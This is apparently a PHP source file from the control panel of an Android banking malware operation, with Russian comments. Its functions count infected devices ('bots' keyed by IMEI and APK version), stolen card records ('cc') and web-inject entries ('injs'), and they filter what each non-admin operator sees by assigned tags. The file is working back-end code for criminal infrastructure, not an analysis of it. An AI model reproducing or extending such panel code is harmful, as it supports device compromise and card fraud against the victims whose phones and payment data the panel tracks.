<?php
class functions{

	function getBots(){
		$CountBots = 0;
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql = "SELECT version_apk, country, lastConnect, firstConnect FROM kliets";

		/****Ограничение по тегам****/
		$userRights = new users_right;
		$tags = explode("|", $userRights->getPrivateTags());
		$thisTag = explode(",", $tags[0]);
		$privateTag = explode(",", $tags[1]);
		/****************************/

		foreach($connection->query($sql) as $row){
			$country = $row['country'];
			$version_apk = $row['version_apk'];
			if($_SESSION['panel_right']!="admin")//Ограничение по тегам
					{
						$boolContinue=true;
						
						if($tags[0]!=",")
						{
							foreach($thisTag as $tag)
							{
								if($version_apk == $tag)
								{
									if($tag!="")
									{
										$boolContinue=false;
										break;
									}
								}
							}
							if($boolContinue)continue;

						}
						else
						{
							foreach($privateTag as $tag)
							{
								if($version_apk == $tag)
								{
									if($tag!="")
									{
										$boolContinue=false;
										break;
									}
								}
							}
							if(!$boolContinue)continue;
						}
					}//---------------

		$CountBots++;
		}
	return $CountBots;
	}

	function getCards(){
		$CountCards = 0;
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql = "SELECT version_apk, country, lastConnect, firstConnect FROM cc";

		/****Ограничение по тегам****/
		$userRights = new users_right;
		$tags = explode("|", $userRights->getPrivateTags());
		$thisTag = explode(",", $tags[0]);
		$privateTag = explode(",", $tags[1]);
		/****************************/

			$sql = "SELECT imei FROM cc";

		foreach($connection->query($sql) as $row)
		{
			$imei = $row['imei'];

			$connection2 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection2->exec('SET NAMES utf8');
			$sql2 = "SELECT IMEI, version_apk  FROM kliets";
			foreach($connection2->query($sql2) as $row2)
			{
				if($row2['IMEI'] == $imei)
				{
					$tag = $row2['version_apk'];
					break;
				}
			}

				if($_SESSION['panel_right']!="admin")//Ограничение по тегам
				{
					$boolContinue=true;
						if($tags[0]!=",")
					{
						foreach($thisTag as $tagZ)
						{
							if($tag == $tagZ)
							{
								if($tagZ!="")
								{
									$boolContinue=false;
									break;
								}
							}
						}
						if($boolContinue)continue;

					}
					else
					{
						foreach($privateTag as $tagZ)
						{
							if($tag == $tagZ)
							{
								if($tagZ!="")
								{
									$boolContinue=false;
									break;
								}
							}
						}
						if(!$boolContinue)continue;
					}
				}//---------------
			$CountCards++;
		}
	return $CountCards;
	}

	function getInjections(){
		$CountInj = 0;
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql = "SELECT version_apk, country, lastConnect, firstConnect FROM cc";

		/****Ограничение по тегам****/
		$userRights = new users_right;
		$tags = explode("|", $userRights->getPrivateTags());
		$thisTag = explode(",", $tags[0]);
		$privateTag = explode(",", $tags[1]);
		/****************************/

		$sql = "SELECT idbot FROM injs";

		foreach($connection->query($sql) as $row)
		{
			$imei = $row['idbot'];

			$connection2 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection2->exec('SET NAMES utf8');
			$sql2 = "SELECT IMEI, version_apk  FROM kliets";
			foreach($connection2->query($sql2) as $row2)
			{
				if($row2['IMEI'] == $imei)
				{
					$tag = $row2['version_apk'];
					break;
				}
			}

				if($_SESSION['panel_right']!="admin")//Ограничение по тегам
				{
					$boolContinue=true;
					if($tags[0]!=",")
					{
						foreach($thisTag as $tagZ)
						{
							if($tag == $tagZ)
							{
								if($tagZ!="")
								{
									$boolContinue=false;
									break;
								}
							}
						}
						if($boolContinue)continue;

					}
					else
					{
						foreach($privateTag as $tagZ)
						{
							if($tag == $tagZ)
							{
								if($tagZ!="")
								{
									$boolContinue=false;
									break;
								}
							}
						}
						if(!$boolContinue)continue;
					}
				}//---------------
			$CountInj++;
		}
	return $CountInj;
	}
}
